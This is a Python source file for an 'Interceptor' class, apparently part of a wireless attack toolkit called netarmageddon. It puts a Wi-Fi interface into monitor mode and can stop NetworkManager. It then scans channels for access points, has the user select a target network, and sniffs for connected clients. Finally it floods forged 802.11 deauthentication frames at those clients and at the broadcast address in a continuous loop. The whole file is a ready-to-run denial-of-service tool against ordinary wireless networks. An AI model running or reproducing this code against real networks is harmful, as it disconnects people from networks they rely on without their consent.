#!/usr/bin/env python3

import copy
import logging
import re
import subprocess
import threading
import traceback
from collections import defaultdict
from pathlib import Path
from threading import Thread
from time import sleep
from typing import Any, Dict, Generator, List, Union

from netarmageddon.utils.misc_helpers import get_time
from netarmageddon.utils.net_definitions import BD_MACADDR, SSID, BandType, frequency_to_channel
from netarmageddon.utils.output_manager import (
    BOLD,
    RESET,
    DELIM,
    THIN_DELIM,
    BRIGHT_CYAN,
    BRIGHT_WHITE,
    BRIGHT_GREEN,
    BRIGHT_RED,
    BRIGHT_YELLOW,
    DIM,
    CLEAR,
    CMD,
    DEBUG,
    ERROR,
    INFO,
    INPUT,
    SUCCESS,
    printf,
)
from scapy.all import sendp, sniff
from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoResp,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Elt,
    Dot11ProbeResp,
    Dot11QoS,
    Dot11ReassoResp,
    RadioTap,
)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class Interceptor:
    _ABORT = False
    _PRINT_STATS_INTV = 1
    _DEAUTH_INTV = 0.100  # 100 ms
    _CH_SNIFF_TO = 2
    _SSID_STR_PAD = 42  # total line width ~80

    def __init__(
        self,
        net_iface: str,
        skip_monitor_mode_setup: bool,
        kill_networkmanager: bool,
        ssid_name: Union[str, None],
        bssid_addr: Union[str, None],
        custom_client_macs: Union[List[str], None],
        custom_channels: Union[List[str], None],
        deauth_all_channels: bool,
        autostart: bool,
        debug_mode: bool,
    ) -> None:
        self.interface = net_iface
        self._debug_mode = debug_mode

        self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV

        self._current_channel_num = None
        self._current_channel_aps: set = set()
        self.attack_loop_count = 0
        self.target_ssid: Union[SSID, None] = None

        if not skip_monitor_mode_setup:
            INFO("Setting up monitor mode...")
            if not self._enable_monitor_mode("monitor"):
                ERROR("Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            SUCCESS("Monitor mode set up successfully")
        else:
            INFO("Skipping monitor mode setup")

        if kill_networkmanager:
            INFO("Killing NetworkManager...")
            if not self._kill_networkmanager():
                ERROR("Failed to kill NetworkManager")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self.log_debug(f"Supported channels: {list(self._channel_range.keys())}")

        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
        self.log_debug(f"Custom SSID name: {self._custom_ssid_name}")

        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
        self.log_debug(f"Custom BSSID addr: {self._custom_bssid_addr}")

        self._custom_target_client_mac: List[str] = self.parse_custom_client_mac(custom_client_macs)
        self.log_debug(f"Target client MACs: {self._custom_target_client_mac}")

        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
        self.log_debug(f"Target channels: {self._custom_target_ap_channels}")

        self._custom_target_ap_last_ch = 0
        self._midrun_output_buffer: List[str] = []
        self._midrun_output_lck = threading.RLock()

        self._deauth_all_channels = deauth_all_channels

        self._ch_iterator: Union[Generator[int, None, int], None] = None
        if self._deauth_all_channels:
            self._ch_iterator = self._init_channels_generator()
        ch_status = BRIGHT_GREEN if self._deauth_all_channels else BRIGHT_RED
        INFO(f"De-auth all channels → {BOLD}{ch_status}{self._deauth_all_channels}{RESET}")

        self._autostart = autostart

    # ── Running property ──────────────────────────────────────────────────────

    @property
    def running(self) -> bool:
        return not Interceptor._ABORT

    # ── Parsing helpers ───────────────────────────────────────────────────────

    @staticmethod
    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
        if ssid_name is not None:
            ssid_name = str(ssid_name)
            if len(ssid_name) == 0:
                ERROR("Custom SSID name cannot be an empty string")
                raise ValueError("Invalid SSID name")
        return ssid_name

    @staticmethod
    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
        if bssid_addr is not None:
            try:
                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
            except Exception as exc:
                ERROR(f"Invalid BSSID address → {bssid_addr}")
                raise Exception(f"{exc} Bad custom BSSID mac address")
        return bssid_addr

    @staticmethod
    def verify_mac_addr(mac_addr: str) -> str:
        """Validate and normalise a MAC address string using an explicit regex."""
        mac_addr = mac_addr.strip().lower().replace("-", ":")
        pattern = r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$"
        if not re.match(pattern, mac_addr):
            raise ValueError(f"Invalid MAC address format: {mac_addr!r}")
        return mac_addr

    @staticmethod
    def parse_custom_client_mac(client_mac_addrs: Union[None, List[str]]) -> List[str]:
        """Parse and validate a list of client MAC addresses.

        Accepts either None or a list of MAC strings (as delivered by argparse
        when the user passes ``--clients mac1,mac2`` via the lambda type).
        """
        custom_client_mac_list: List[str] = []

        if client_mac_addrs is None:
            INFO("No custom clients selected — broadcast deauth enabled (all connected clients)")
            return custom_client_mac_list

        # Support both a pre-split list and a raw comma-separated string
        if isinstance(client_mac_addrs, str):
            macs = client_mac_addrs.split(",")
        else:
            macs = list(client_mac_addrs)

        for mac in macs:
            try:
                custom_client_mac_list.append(Interceptor.verify_mac_addr(mac.strip()))
            except Exception as exc:
                ERROR(f"Invalid custom client MAC address → {mac}")
                raise Exception(f"{exc} Bad custom client mac address")

        if custom_client_mac_list:
            INFO(
                f"Targeting {BOLD}{len(custom_client_mac_list)}{RESET} custom client(s):"
                f" {BRIGHT_CYAN}{custom_client_mac_list}{RESET}"
            )
        return custom_client_mac_list

    def parse_custom_channels(self, channel_list: Union[None, List[str], str]) -> List[int]:
        """Parse channel numbers from either a List[str] (argparse nargs="+") or a
        comma-separated string (direct API / test usage), validating against supported channels.
        """
        ch_list: List[int] = []
        if channel_list is None:
            return ch_list

        # Normalise: accept both a raw "1,6,11" string and a ["1","6","11"] list
        if isinstance(channel_list, str):
            tokens = [t.strip() for t in channel_list.split(",") if t.strip()]
        else:
            tokens = list(channel_list)

        try:
            ch_list = [int(ch) for ch in tokens]
        except (ValueError, TypeError) as exc:
            ERROR(f"Invalid custom channel input → {channel_list}")
            raise Exception(f"{exc} Bad custom channel input")

        if ch_list:
            supported = set(self._channel_range.keys())
            for ch in ch_list:
                if ch not in supported:
                    ERROR(
                        f"Channel {ch} is not supported by {self.interface}"
                        f" (supported: {sorted(supported)})"
                    )
                    raise Exception("Unsupported channel")

        return ch_list

    # ── Monitor mode ──────────────────────────────────────────────────────────

    def _enable_monitor_mode(self, mode: str) -> bool:
        script_path = Path(__file__).resolve().parents[2] / "scripts" / "toggle_wireless_mode.sh"

        if not script_path.exists():
            self.log_debug(f"Script not found: {script_path}")
            return False

        cmd = ["sudo", "bash", str(script_path), self.interface, mode]
        CMD(f"Running → {' '.join(cmd)}")

        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            self.log_debug(f"Script failed: {e}")
            return False

        sleep(2)

        iface_check = subprocess.run(
            f"iw dev {self.interface} info | grep 'type {mode}'",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if iface_check.returncode != 0:
            self.log_debug(f"{mode} mode NOT confirmed on {self.interface}")
            return False

        self.log_debug(f"{mode} mode confirmed on {self.interface}")
        return True

    @staticmethod
    def _kill_networkmanager() -> bool:
        cmd = ["systemctl", "stop", "NetworkManager"]
        CMD(f"Running → {BOLD}{' '.join(cmd)}{RESET}")
        result = subprocess.run(cmd, capture_output=True)
        return result.returncode == 0

    def _set_channel(self, ch_num: int) -> None:
        subprocess.run(
            ["iw", "dev", self.interface, "set", "channel", str(ch_num)], capture_output=True
        )
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        try:
            result = subprocess.run(
                ["iwlist", self.interface, "channel"], capture_output=True, text=True
            )
            return [
                int(line.split("Channel")[1].split(":")[0].strip())
                for line in result.stdout.splitlines()
                if "Channel" in line and "Current" not in line
            ]
        except Exception:
            return []

    # ── AP scanning ───────────────────────────────────────────────────────────

    def _get_channel_range(self) -> List[int]:
        return self._custom_target_ap_channels or list(self._channel_range.keys())

    def _ap_sniff_cb(self, pkt: Any) -> None:
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = (
                    pkt[Dot11Elt].info.strip(b"\x00").decode("utf-8", errors="replace").strip()
                    or ap_mac
                )
                if (
                    ap_mac == BD_MACADDR
                    or not ssid
                    or (
                        self._custom_ssid_name_is_set()
                        and self._custom_ssid_name.lower() not in ssid.lower()
                    )
                ):
                    return
                if (
                    self._custom_bssid_addr_is_set()
                    and ap_mac.lower() != self._custom_bssid_addr.lower()
                ):
                    return

                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ

                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)

                self._all_ssids[band_type][ssid].add_channel(
                    pkt_ch if pkt_ch in self._channel_range else self._current_channel_num
                )

                if self._custom_ssid_name_is_set():
                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ssid].channel

            else:
                if self.target_ssid is not None:
                    self._clients_sniff_cb(pkt)

        except Exception as exc:
            ERROR(f"{exc}")

    def _scan_channels_for_aps(self) -> None:
        channels_to_scan = self._get_channel_range()
        INFO(f"Scanning {BOLD}{len(channels_to_scan)}{RESET} channels for access points...")

        if self._custom_ssid_name_is_set():
            INFO(f"Looking for SSID → {BOLD}{BRIGHT_CYAN}{self._custom_ssid_name}{RESET}")

        try:
            for idx, ch_num in enumerate(channels_to_scan):
                if (
                    self._custom_ssid_name_is_set()
                    and self._found_custom_ssid_name()
                    and self._current_channel_num - self._custom_target_ap_last_ch > 2
                ):
                    return
                self._set_channel(ch_num)
                remaining = len(channels_to_scan) - (idx + 1)
                INFO(
                    f"  {BRIGHT_CYAN}ch {BOLD}{self._current_channel_num:3d}{RESET}"
                    f"  {DIM}({remaining} remaining){RESET}",
                    end="\r",
                )
                sniff(
                    prn=self._ap_sniff_cb,
                    iface=self.interface,
                    timeout=Interceptor._CH_SNIFF_TO,
                    stop_filter=lambda p: Interceptor._ABORT is True,
                )
        finally:
            printf("")

    def _found_custom_ssid_name(self) -> bool:
        for all_channel_aps in self._all_ssids.values():
            for ssid_name in all_channel_aps.keys():
                if ssid_name == self._custom_ssid_name:
                    return True
        return False

    def _custom_ssid_name_is_set(self) -> bool:
        return self._custom_ssid_name is not None

    def _custom_bssid_addr_is_set(self) -> bool:
        return self._custom_bssid_addr is not None

    def _start_initial_ap_scan(self) -> SSID:
        self._scan_channels_for_aps()

        for band_ssids in self._all_ssids.values():
            for ssid_name, ssid_obj in band_ssids.items():
                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        printf(f"\n{DELIM}")
        col_ssid = f"{BOLD}{BRIGHT_WHITE}{'SSID Name':<{Interceptor._SSID_STR_PAD}}{RESET}"
        col_ch = f"{BOLD}{BRIGHT_YELLOW}{'Ch':<6}{RESET}"
        col_mac = f"{BOLD}{BRIGHT_CYAN}{'MAC Address'}{RESET}"
        printf(f"  {BRIGHT_CYAN}{'#':>4}{RESET}  {col_ssid}{col_ch}{col_mac}")
        printf(THIN_DELIM)

        ctr = 0
        target_map: Dict[int, SSID] = {}

        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in all_channel_aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                num_str = f"  {BOLD}{BRIGHT_YELLOW}{ctr:>4}{RESET}  "
                ssid_str = f"{ssid_obj.name:<{Interceptor._SSID_STR_PAD}}"
                ch_str = f"{BRIGHT_GREEN}{str(ssid_obj.channel):<6}{RESET}"
                mac_str = f"{BRIGHT_CYAN}{ssid_obj.mac_addr}{RESET}"
                printf(f"{num_str}{ssid_str}{ch_str}{mac_str}")

        if not target_map:
            Interceptor.abort_run("No APs were found — quitting")

        printf(DELIM)

        chosen = -1
        if self._autostart:
            if len(target_map) > 1:
                ERROR("Cannot autostart — found more than 1 AP. Use tighter filters.")
            else:
                INFO("Single target found and autostart is set")
                chosen = 1

        while chosen not in target_map:
            raw = INPUT(f"Select target [{min(target_map.keys())}–{max(target_map.keys())}]:")
            try:
                chosen = int(raw)
            except ValueError:
                ERROR("Please enter an integer")

        return target_map[chosen]

    def _generate_ssid_str(self, ssid: str, ch: object, mcaddr: str, preflen: int) -> str:
        pad = Interceptor._SSID_STR_PAD - preflen
        return (
            f"{ssid.ljust(pad, ' ')}"
            f"{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}"
            f"{mcaddr}"
        )

    # ── Client sniffing ───────────────────────────────────────────────────────

    def _clients_sniff_cb(self, pkt: Any) -> None:
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if (
                        c_mac not in [BD_MACADDR, self.target_ssid.mac_addr]
                        and c_mac not in self.target_ssid.clients
                    ):
                        self.target_ssid.clients.append(c_mac)
                        will_target = (
                            len(self._custom_target_client_mac) == 0
                            or c_mac in self._custom_target_client_mac
                        )
                        with self._midrun_output_lck:
                            colour = BRIGHT_GREEN if will_target else BRIGHT_RED
                            self._midrun_output_buffer.append(
                                f"  New client {BOLD}{BRIGHT_CYAN}{c_mac}{RESET}"
                                f" → targeting: {colour}{BOLD}{will_target}{RESET}"
                            )
        except Exception as exc:
            ERROR(f"{exc}")

    def _print_midrun_output(self) -> int:
        bf_sz = len(self._midrun_output_buffer)
        with self._midrun_output_lck:
            for output in self._midrun_output_buffer:
                CMD(output)
            if bf_sz > 0:
                printf(THIN_DELIM)
                bf_sz += 1
            self._midrun_output_buffer.clear()
        return bf_sz

    @staticmethod
    def _packet_confirms_client(pkt: Any) -> bool:
        return (
            (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0)
            or (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0)
            or pkt.haslayer(Dot11QoS)
        )

    def _listen_for_clients(self) -> None:
        INFO("Listening for new clients...")
        sniff(
            prn=self._clients_sniff_cb,
            iface=self.interface,
            stop_filter=lambda p: Interceptor._ABORT is True,
        )

    def _get_target_clients(self) -> List[str]:
        return self._custom_target_client_mac or self.target_ssid.clients

    # ── Deauth loop ───────────────────────────────────────────────────────────

    def _run_deauther(self) -> None:
        try:
            INFO("Starting deauth loop...")
            failed_attempts_ctr = 0
            ap_mac = self.target_ssid.mac_addr

            while not Interceptor._ABORT:
                try:
                    if self._deauth_all_channels:
                        self._iter_next_channel()
                    self.attack_loop_count += 1
                    for client_mac in self._get_target_clients():
                        self._send_deauth_client(ap_mac, client_mac)
                    if not self._custom_target_client_mac:
                        self._send_deauth_broadcast(ap_mac)
                    failed_attempts_ctr = 0
                except Exception as exc:
                    failed_attempts_ctr += 1
                    if failed_attempts_ctr >= self._max_consecutive_failed_send_lim:
                        raise exc
                    sleep(Interceptor._DEAUTH_INTV)

        except Exception as exc:
            Interceptor.abort_run(f"Exception '{exc}' in deauth-loop → {traceback.format_exc()}")

    def _send_deauth_client(self, ap_mac: str, client_mac: str) -> None:
        pkt_to_client = (
            RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
        )
        pkt_to_ap = (
            RadioTap() / Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) / Dot11Deauth(reason=7)
        )
        sendp(pkt_to_client, iface=self.interface, verbose=False)
        sendp(pkt_to_ap, iface=self.interface, verbose=False)

    def _send_deauth_broadcast(self, ap_mac: str) -> None:
        pkt = (
            RadioTap() / Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
        )
        sendp(pkt, iface=self.interface, verbose=False)

    # ── Entry point ───────────────────────────────────────────────────────────

    def start(self) -> None:
        self.target_ssid = self._start_initial_ap_scan()
        ssid_ch = self.target_ssid.channel
        INFO(f"Targeting {BOLD}{BRIGHT_CYAN}{self.target_ssid.name}{RESET}")
        INFO(f"Setting channel → {BOLD}{BRIGHT_YELLOW}{ssid_ch}{RESET}")
        self._set_channel(ssid_ch)

        printf(f"{DELIM}\n")

        threads = [
            Thread(target=self._run_deauther, daemon=True),
            Thread(target=self._listen_for_clients, daemon=True),
            Thread(target=self.report_status, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def report_status(self) -> None:
        start = get_time()
        printf(f"{DELIM}\n")

        while not Interceptor._ABORT:
            buffer_sz = self._print_midrun_output()
            printf(THIN_DELIM)
            INFO(f"  Target SSID   {BOLD}{BRIGHT_CYAN}{self.target_ssid.name}{RESET}")
            INFO(f"  Channel       {BOLD}{BRIGHT_YELLOW}{self._current_channel_num}{RESET}")
            INFO(f"  BSSID         {BOLD}{BRIGHT_CYAN}{self.target_ssid.mac_addr}{RESET}")
            INFO(f"  Interface     {BOLD}{BRIGHT_WHITE}{self.interface}{RESET}")
            INFO(f"  Clients       {BOLD}{BRIGHT_GREEN}{len(self._get_target_clients())}{RESET}")
            INFO(f"  Elapsed       {BOLD}{BRIGHT_WHITE}{get_time() - start}s{RESET}")
            INFO(f"  Packets sent  {BOLD}{BRIGHT_WHITE}{self.attack_loop_count}{RESET}")
            printf(THIN_DELIM)
            sleep(Interceptor._PRINT_STATS_INTV)
            if Interceptor._ABORT:
                break
            CLEAR(8 + buffer_sz)

    # ── Utilities ─────────────────────────────────────────────────────────────

    def log_debug(self, msg: str) -> None:
        if self._debug_mode:
            DEBUG(msg)

    @staticmethod
    def user_abort(*_: object) -> None:
        Interceptor.abort_run("User requested stop — quitting")

    @staticmethod
    def abort_run(msg: str) -> None:
        if not Interceptor._ABORT:  # thread-safe under GIL
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)
            printf(DELIM)
            ERROR(msg)
            exit(0)

    def _iter_next_channel(self) -> None:
        self._set_channel(next(self._ch_iterator))

    def _init_channels_generator(self) -> Generator[int, None, int]:
        ch_range = self._get_channel_range()
        ctr = 0
        while not Interceptor._ABORT:
            yield ch_range[ctr]
            ctr = (ctr + 1) % len(ch_range)
        return ctr

    # ── Context manager (for API consistency) ─────────────────────────────────

    def __enter__(self) -> "Interceptor":
        return self

    def __exit__(self, exc_type: object, exc_val: object, exc_tb: object) -> None:
        if not Interceptor._ABORT:
            Interceptor._ABORT = True
